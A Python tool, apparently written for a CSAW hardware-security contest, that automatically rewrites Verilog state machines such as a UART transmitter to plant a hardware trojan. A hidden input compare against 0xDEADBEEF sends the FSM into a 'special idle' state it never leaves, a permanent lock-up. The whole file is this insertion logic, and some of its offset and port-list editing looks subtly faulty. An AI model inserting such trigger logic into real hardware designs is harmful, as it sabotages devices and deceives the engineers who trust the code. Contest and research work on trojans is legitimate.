from pathlib import Path
import re
from typing import List, Optional, Tuple

class FSMCaseModifier:
    """Detect and modify FSM by finding case(state) and state labels"""
    
    def __init__(self):
        # Core patterns for state machine detection
        self.case_state_patterns = [
            r'case\s*\(\s*state\s*\)',
            r'case\s*\(\s*\w+_state\s*\)',
            r'case\s*\(\s*current_state\s*\)',
            r'case\s*\(\s*next_state\s*\)'
        ]
        
        # Common state label patterns
        self.state_label_patterns = [
            r'(IDLE)\s*:',
            r'(START)\s*:',
            r'(INIT)\s*:',
            r'(WAIT)\s*:'
        ]
    
    def detect_and_modify_fsm(self, file_path: Path) -> bool:
        """
        Detect FSM by case(state) pattern and modify it.
        
        Args:
            file_path: Path to the Verilog file
            
        Returns:
            bool: True if FSM was found and modified
        """
        try:
            content = file_path.read_text()
            
            # First, find the state register name
            state_reg = self._find_state_register(content)
            if not state_reg:
                print(f"No state register found in {file_path}")
                return False
            
            # Look for case statement blocks
            case_blocks = self._find_case_blocks(content)
            if not case_blocks:
                print(f"No case statements found in {file_path}")
                return False
            
            # Modify the content
            modified_content = self._modify_fsm(content, case_blocks, state_reg)
            
            # Write back to file
            backup_path = file_path.with_suffix('.v.bak')
            file_path.rename(backup_path)  # Create backup
            file_path.write_text(modified_content)
            
            print(f"Successfully modified FSM in {file_path}")
            print(f"Backup created at {backup_path}")
            return True
            
        except Exception as e:
            print(f"Error processing {file_path}: {str(e)}")
            return False
    
    def _find_state_register(self, content: str) -> Optional[str]:
        """Find the state register name from the case statement"""
        for pattern in self.case_state_patterns:
            match = re.search(pattern, content)
            if match:
                # Extract the full state register name
                case_line = match.group(0)
                state_reg = re.search(r'\(\s*(\w+(?:_state|_STATE)?)\s*\)', case_line)
                if state_reg:
                    return state_reg.group(1)
        return None
    
    def _find_case_blocks(self, content: str) -> List[Tuple[int, int, str]]:
        """Find all case statement blocks and their state labels"""
        case_blocks = []
        
        for pattern in self.case_state_patterns:
            for match in re.finditer(pattern, content):
                start_pos = match.start()
                # Find the matching endcase
                case_content = content[start_pos:]
                end_pos = self._find_matching_endcase(case_content)
                if end_pos is not None:
                    case_blocks.append((
                        start_pos,
                        start_pos + end_pos,
                        case_content[:end_pos]
                    ))
        
        return case_blocks
    
    def _find_matching_endcase(self, content: str) -> Optional[int]:
        """Find the matching endcase for a case statement"""
        case_count = 1
        pos = 0
        
        while case_count > 0 and pos < len(content):
            # Find next case or endcase
            match = re.search(r'\b(case|endcase)\b', content[pos:])
            if not match:
                return None
                
            if match.group(1) == 'case':
                case_count += 1
            else:
                case_count -= 1
                
            pos += match.end()
            
            if case_count == 0:
                return pos
                
        return None
    
    def _modify_fsm(self, content: str, case_blocks: List[Tuple[int, int, str]], state_reg: str) -> str:
        """Modify the FSM to add deadbeef detection"""
        modified_content = content
        offset = 0  # Track string length changes
        
        for start_pos, end_pos, case_content in case_blocks:
            # Add new parameter definitions before module
            param_insert = f"""
    // Added deadbeef detection states
    parameter DEADBEEF_DETECT_STATE = {len(self.state_label_patterns) + 1};
    parameter SPECIAL_IDLE_STATE = {len(self.state_label_patterns) + 2};
"""
            module_match = re.search(r'module\s+\w+\s*\(', modified_content)
            if module_match:
                insert_pos = module_match.start()
                modified_content = modified_content[:insert_pos] + param_insert + modified_content[insert_pos:]
                offset += len(param_insert)
            
            # Add deadbeef input wire
            input_insert = """
    input wire [31:0] data_in,  // Input to check for deadbeef
"""
            if module_match:
                insert_pos = module_match.end()
                modified_content = modified_content[:insert_pos] + input_insert + modified_content[insert_pos:]
                offset += len(input_insert)
            
            # Add new states to case statement
            deadbeef_states = f"""
            
            DEADBEEF_DETECT_STATE: begin
                if (data_in == 32'hDEADBEEF) begin
                    {state_reg} <= SPECIAL_IDLE_STATE;
                end else begin
                    {state_reg} <= IDLE;
                end
            end
            
            SPECIAL_IDLE_STATE: begin
                // Do nothing, stay in special idle state
                {state_reg} <= SPECIAL_IDLE_STATE;
            end
"""
            # Find position before endcase
            endcase_pos = start_pos + offset + case_content.rfind('endcase')
            modified_content = modified_content[:endcase_pos] + deadbeef_states + modified_content[endcase_pos:]
            offset += len(deadbeef_states)
            
            # Add deadbeef detection to existing states
            for state_pattern in self.state_label_patterns:
                for state_match in re.finditer(state_pattern, case_content):
                    state_name = state_match.group(1)
                    state_block_start = start_pos + offset + state_match.end()
                    
                    # Add deadbeef detection logic to each state
                    deadbeef_check = f"""
                if (data_in == 32'hDEADBEEF) begin
                    {state_reg} <= DEADBEEF_DETECT_STATE;
                end else """
                    
                    # Find the first state assignment
                    state_assign = re.search(f'{state_reg}\s*<=', modified_content[state_block_start:end_pos + offset])
                    if state_assign:
                        insert_pos = state_block_start + state_assign.start()
                        modified_content = modified_content[:insert_pos] + deadbeef_check + modified_content[insert_pos:]
                        offset += len(deadbeef_check)
        
        return modified_content

# Example usage
if __name__ == "__main__":
    modifier = FSMCaseModifier()
    
    # Modify a single file
    file_path = Path("/media/iamme/Data/____Contests/2024 CSAW/RTL Code/Project_1_UART_peripheral/rtl_infected/uart_tx.v")
    if modifier.detect_and_modify_fsm(file_path):
        print("FSM modification complete!")
    else:
        print("No FSM found or modification failed.")
 